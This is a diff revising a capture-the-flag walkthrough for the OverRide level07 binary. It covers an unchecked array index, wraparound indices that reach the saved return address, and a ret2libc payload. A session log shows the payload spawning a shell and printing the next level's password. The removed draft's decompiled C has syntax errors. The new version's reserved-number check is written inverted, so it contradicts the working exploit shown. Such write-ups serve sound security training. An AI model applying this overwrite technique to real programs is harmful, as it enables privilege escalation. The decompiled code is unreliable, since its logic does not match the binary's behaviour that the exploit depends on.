@@ -1,140 +1,221 @@
-int get_unum(){
-    unsigned int input;
+# OverRide — Level07 Walkthrough
 
-    fflush(stdout);
-    scanf("%u", input);
-    
-    clear_stdin();
+## Binary Analysis
 
-    return(input);
+The program provides a small interactive interface with 3 commands:
+
+- `store`: write a number at an index,
+- `read`: read a number from an index,
+- `quit`: exit.
+
+Core decompiled logic:
+
+```c
+void clear_stdin() {
+    int8_t val = 0;
+
+    while (1) {
+        val = getchar();
+        if (val == '\n' || val == EOF) {
+            return;
+        }
+    }
 }
 
-int store_number(int *tab) {
-    unsigned int input = 0; /* ebp-0x10 */
-    unsigned int index = 0; /* ebp-0xc */
+unsigned int get_unum(void) {
+    uint32_t var1 = 0;
+
+    fflush(stdout);
+    scanf("%u", &var1);
+    clear_stdin();
+    return var1;
+}
+
+void prog_timeout() {
+    exit(1);
+}
+
+int store_number(int32_t *buffer) {
+    uint32_t number; // EBP - 0x10
+    uint32_t index; // EBP - 0xc
 
     printf(" Number: ");
+    number = get_unum();
     printf(" Index: ");
-
     index = get_unum();
 
-    if ( index % 3 == 0 || (input >> 24) == 183 ) {
+    if (!(index % 3) || number >> 0x18 != 0xb7) {
         puts(" *** ERROR! ***");
         puts("   This index is reserved for wil!");
         puts(" *** ERROR! ***");
-
         return 1;
     }
-    tab[index] = input;
-    return (0);
-}
-
-int read_number(int* tab){
-    unsigned int input = 0; /* ebp-0xc */
-
-    printf(" Index: ");
-
-    input = get_unum(); 
-
-    printf(" Number at data[%u] is %u\n", input, tab[input]);
-
+    buffer[index] = number;
     return 0;
 }
 
-int main(int argc, char **argv) {
+int read_number(int32_t *buffer) {
+    uint32_t index = 0; // EBP - 0xc
 
-    int ret = 0; /* esp + 0x1b4 */
-    char buffer[20]; /* esp + 0x1b8 */
-    int tab[100] = 0; /* esp + 0x24 */
+    printf(" Index:");
+    index = get_unum();
+    printf(" Number at data[%u] is %u\n", index, buffer[index]);
+    return 0;
+}
 
-    for (int i = 0; argv[i] != 0; i++) {
-        memset(argv[i], 0, strlen(argv[i]) - 1);
-    }   
+int main(int argc, char *argv[], char *envp[]) {
+    int8_t buffer[0x64] = {0}; // ESP + 0x24
+    int8_t **av = argv; // ESP + 0x1c
+    int8_t **ep = envp; // ESP + 0x18
 
-    for (int i = 0; env[i] != 0, i++) {
-        memset(env[i], 0, strlen(env[i] - 1));
+    int32_t cmd_ret = 0; // ESP + 0x1b4
+    int8_t cmd_buffer[20] = {0}; // ESP + 0x1b8
+
+    while (*av) {
+        memset(*av, 0, strlen(*av));
+        *av++;
+    }
+    while (*ep) {
+        memset(*ep, 0, strlen(*ep));
+        *ep++;
     }
 
-    puts("----------------------------------------------------\n"\
-        "\n  Welcome to wil's crappy number storage service!   \n"\
-        "----------------------------------------------------"\)
-
-    while(true){
+    puts("----------------------------------------------------\n  Welcome to wil's crappy number storage service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------");
+    
+    while (1) {
         printf("Input command: ");
-        ret = 1;
-        fgets(&buffer, 20, stdin);
+        fgets(cmd_buffer, 0x14, stdin);
+        cmd_buffer[strlen(&cmd_buffer) - 1] = 0;
 
-        buffer[strlen(buffer) - 2] = 0;
-
-        if (strncmp("store", buffer, 5) == 0) {
-            ret = store_number(&tab);
-
-        } else if (strncmp("read", buffer, 4) == 0) {
-            ret = read_number(&tab);
-
-        } else if (strncmp("quit", buffer, 4) == 0) {
+        if (!strncmp(cmd_buffer, "store", 5)) {
+            cmd_ret = store_number(buffer);
+        } else if (!strncmp(cmd_buffer, "read", 4)) {
+            cmd_ret = read_number(buffer);
+        } else if (!strncmp(cmd_buffer, "quit", 4)) {
             return 0;
         }
 
-        if (ret != 0) {
-            printf(" Failed to do %s command\n", buffer);
-
+        if (cmd_ret == 0) {
+            printf(" Completed %s command successfully\n", &cmd_buffer);
         } else {
-            printf(" Completed %s command successfully\n", buffer);
-
+            printf(" Failed to do %s command\n", &cmd_buffer);
         }
-
-        bzero(buffer, 5 * 4);
-        return 
+        memset(&cmd_buffer, 0, 0x14);
     }
     return 0;
-
 }
+```
 
-the program open an interface which allows us to store and read numbers in an array. We have 3 commands which are :
-store (we give a index and a number to store)
-read (read the number at a given index)
-quit (quit program)
+Main weakness: no real bounds check on `index` before accessing `tab[index]`.
 
-we can overwrite eip cause the program allocate an int array of 100 (int tab[100]) but when we use store and read the program never check the index.
+## Vulnerability
 
-if we want to overwrite eip we need to bypass that check (index % 3 == 0 ) in store_number, which prevent us to store in any index which is divisble by 3. hopefully the program dont do any other checks on the index. So we can input very large index that pass the (index % 3 == 0 ) check but when the program try to write on that index the integer will overflow on this line (tab[index] = input;) cause when the compilator try to find the address of tab[index] it does this calculation (see asm) targetAddr = tabAddr + (index * sizeof(tabType)) in this case tabType is an int so sizeof(int) == 4. So if we give an index larger than UNINT_MAX / 4 + 1 it will overflow ((UNINT_MAX / 4 + 1) * 4) = 0.
+`tab` is only `int tab[100]`, but user-controlled indices are not constrained.
 
-now we need to find the eip offset and cause we cant store our exploit in the env because the porgram flushs it we will need to store it in our tab
+There is one restriction (`index % 3 == 0` is blocked), but it can be bypassed using large unsigned indices. Addressing is computed as:
 
-finding offset
+```text
+target = tab_base + index * 4
+```
 
-offset = 114 explain after
+On 32-bit arithmetic, `index * 4` wraps modulo $2^{32}$. This allows us to reach stack locations outside the array, including saved `EIP`.
 
-building the exploit
+## Finding the Offset
 
-we gonna use ret2lib exploit
+From `gdb`:
 
-in gdb when program is running we need to find system address and "/bin/sh" string:
+```bash
+(gdb) info frame
+Stack level 0, frame at 0xffffd690:
+ Saved registers:
+  ebp at 0xffffd688, eip at 0xffffd68c
 
-system address:
+(gdb) p/x $esp+0x24
+$1 = 0xffffd4c4
+```
+
+So:
+
+```text
+offset = (saved_eip - tab_base) / 4
+offset = (0xffffd68c - 0xffffd4c4) / 4
+offset = 114
+```
+
+To bypass normal indexing, use equivalent wrapped indices:
+
+- `114`  -> `1073741938`
+- `115`  -> `1073741939`
+- `116`  -> `1073741940`
+
+## Exploit Strategy (ret2libc)
+
+Environment variables are cleared by the program, so payload data must be written through the `tab` primitive.
+
+We overwrite saved return values with:
+
+1. `system()` address,
+2. fake return address (`0x0`),
+3. `"/bin/sh"` address.
+
+### Resolve addresses in `gdb`
+
+```bash
 (gdb) p system
 $1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
-
-for "/bin/sh" string we need to find the start of the libc address:
 
 (gdb) info sharedlibrary
 From        To          Syms Read   Shared Object Library
 0xf7fdc820  0xf7ff501f  Yes (*)     /lib/ld-linux.so.2
 0xf7e42f70  0xf7f7633c  Yes (*)     /lib32/libc.so.6
 
-then we can search inside libc to find our string
-
 (gdb) find 0xf7e42f70, +99999999, "/bin/sh"
 0xf7f897ec
+```
 
-so we need to write 0xf7e6aed0 + 0x00000000 + 0xf7f897ec starting from index 114
+Values to write:
 
-index : 114 (1073741938)
-0xf7e6aed0 -> 4159090384
+- `0xf7e6aed0` -> `4159090384`
+- `0x00000000` -> `0`
+- `0xf7f897ec` -> `4160264172`
 
-index : 115 (1073741939)
-0x00000000 -> 0
+## Exploit Execution
 
-index : 116 (1073741940)
-0xf7f897ec -> 4160264172
+```bash
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+
+Input command: store
+ Number: 0
+ Index: 1073741939
+ Completed store command successfully
+
+Input command: store
+ Number: 4160264172
+ Index: 1073741940
+ Completed store command successfully
+
+Input command: quit
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+```
+
+## Result
+
+Successfully gained access as `level08` and recovered the next level password.
